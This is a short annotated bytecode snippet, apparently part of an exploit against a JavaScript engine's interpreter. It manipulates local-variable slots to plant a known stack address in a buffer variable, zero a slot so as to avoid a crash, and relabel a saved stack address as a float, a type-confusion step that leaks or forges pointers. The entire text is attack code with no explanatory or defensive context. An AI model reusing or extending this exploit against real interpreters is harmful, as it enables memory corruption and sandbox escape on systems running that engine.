# get known stack address ending with 8 
get_loc 26

# Zero-out a specific address to avoid segfault
push_0
put_loc 78

# replace var_buf with the known stack address ending in 8
put_loc 18

# Mark a stack address saved on the stack as a float
push_7
put_loc 37

undefined
return